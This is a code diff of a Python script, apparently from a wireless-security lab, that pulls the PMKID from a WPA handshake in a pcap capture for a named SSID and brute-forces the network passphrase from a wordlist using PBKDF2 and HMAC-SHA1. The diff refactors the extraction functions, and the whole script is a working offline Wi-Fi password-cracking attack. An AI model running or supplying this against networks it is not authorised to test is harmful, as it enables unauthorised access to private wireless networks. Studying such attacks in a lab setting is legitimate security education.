@@ -41,48 +41,38 @@ def customPRF512(key, A, B):
     return R[:blen]
 
 
-def getAssociationRequestInfo(packets):
+def getPMKIDInfo(packets, ssid):
     """
-    Will get all the useful values from an association request packet
-    :param packets: the list of packets to analyse
-    :return: the ssid of the AP, the MAC of the AP and the Client
-    """
-    # Search for an association request in the list of packets
-    assocRequests = list(filter(lambda pkt: pkt.haslayer(Dot11AssoReq), packets))
-    # Exception if we do not find any association request
-    if len(assocRequests) == 0:
-        raise Exception("Cannot find association request")
-
-    # Retrieve info from the first association request found
-    pkt = assocRequests[0]
-    # info will give the ssid of the AP
-    ssid = pkt.info.decode('ascii')
-    # addr1 is where the MAC of the AP is stored in the first association request in our case
-    APmac = a2b_hex(pkt.addr1.replace(':', ''))
-    # addr2 is where the MAC of the client is stored in the first association request in our case
-    Clientmac = a2b_hex(pkt.addr2.replace(':', ''))
-    return ssid, APmac, Clientmac
-
-
-def getHandshakeInfo(APmac, Clientmac, packets):
-    """
-    Will get the PMKID from the first message of the 4 way handshake
-    Handshake packets must be in order.
-    :param APmac: the mac address of the access point
-    :param Clientmac: the mac address of the client
+    Will get the PMKID from the first message of the 4 way handshake, as well as the client & AP mac
     :param packets: the list of packets
-    :return: the authenticator nonce, the supplicant nonce, the mic of the fourth message and the data of the fourth message
+    :param ssid: the ssid of the target access point
+    :return: the AP mac, the client mac, the pmkid
     """
-    # Search for all the packets that have the layer WPA_key (This will return the 4 way handshake packets)
-    # and that have the same client mac as destination and the mac address of the access point as source
-    pkts = list(filter(lambda pkt: pkt.haslayer(WPA_key) and
-                                   a2b_hex(pkt.addr1.replace(':', '')) == Clientmac and
-                                   a2b_hex(pkt.addr2.replace(':', '')) == APmac, packets))
+    # Value identifying the first message of the 4-way handshake
+    WPA_HANDSHAKE_MSG_1 = 0x008a
+
+    # Find beacons packets coming from the ssid
+    beacons = list(filter(lambda pkt: pkt.haslayer(Dot11Beacon) and pkt.info == ssid, packets))
+    if len(beacons) == 0:
+        raise Exception("Cannot find beacons for the corresponding ssid")
+
+    # Get the mac of the AP and search for 1st handshake messages
+    APmac = a2b_hex(beacons[0].addr2.replace(':', ''))
+    handshakeMsgs1 = list(filter(lambda pkt: pkt.haslayer(WPA_key) and
+                                             pkt.getlayer(WPA_key).key_info == WPA_HANDSHAKE_MSG_1 and
+                                             a2b_hex(pkt.addr2.replace(':', '')) == APmac, packets))
+    if len(handshakeMsgs1) == 0:
+        raise Exception("Cannot find handshakes for the corresponding ssid")
+
+    Clientmac = a2b_hex(handshakeMsgs1[0].addr1.replace(':', ''))
+
     # Get the WPA_layer of the packets found contains the value of the handshake
-    handshakePkts = list(map(lambda pkt: pkt.getlayer(WPA_key), pkts))
-    # The PMKID are the last 16 bytes of the content of the wpa_key in scapy
-    pmkid = handshakePkts[0].wpa_key[-16:]
-    return pmkid
+    handshakeMsg1 = handshakeMsgs1[0].getlayer(WPA_key)
+
+    # The PMKID is the last 16 bytes of the content of the wpa_key in scapy
+    pmkid = handshakeMsg1.wpa_key[-16:]
+
+    return APmac, Clientmac, pmkid
 
 
 def main():
@@ -90,19 +80,16 @@ def main():
     wpa = rdpcap("PMKID_handshake.pcap")
 
     # Important parameters for key derivation - most of them can be obtained from the pcap file
-    ssid, APmac, Clientmac = getAssociationRequestInfo(wpa)
-    pmkid = getHandshakeInfo(APmac, Clientmac, wpa)
-    pmk_name = b"PMK Name"  # this constant is for the calcul of the PKID
+    TARGET_SSID = b'Sunrise_2.4GHz_DD4B90'
+    APmac, Clientmac, pmkid = getPMKIDInfo(wpa, TARGET_SSID)
+    pmk_name = b"PMK Name"  # this constant is for the calcul of the PMKID
 
     print("\n\nValues used to derivate keys")
     print("============================")
-    print("SSID: ", ssid, "\n")
+    print("SSID: ", TARGET_SSID, "\n")
     print("AP Mac: ", b2a_hex(APmac), "\n")
     print("Client Mac: ", b2a_hex(Clientmac), "\n")
     print("PMKID: ", pmkid.hex(), "\n")
-
-    # Encode the ssid as bytes
-    ssid = str.encode(ssid)
 
     print("\nTrying to find passphrase")
     print("============================")
@@ -113,10 +100,10 @@ def main():
         # Encode the passphrase
         passPhrase = str.encode(passPhrase)
         # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-        pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
+        pmk = pbkdf2(hashlib.sha1, passPhrase, TARGET_SSID, 4096, 32)
         # Calculate the PMKID
         pmkid_test = hmac.new(pmk, pmk_name + APmac + Clientmac, hashlib.sha1)
-        # The sha-1 algorithm as 20 bytes as outputs but PMKID is only 16 bytes long
+        # The sha-1 algorithm has 20 bytes as output but PMKID is only 16 bytes long
         # So we only take the first 16 bytes
         if pmkid == pmkid_test.digest()[:16]:
             print("Working passphrase     : ", passPhrase.decode())
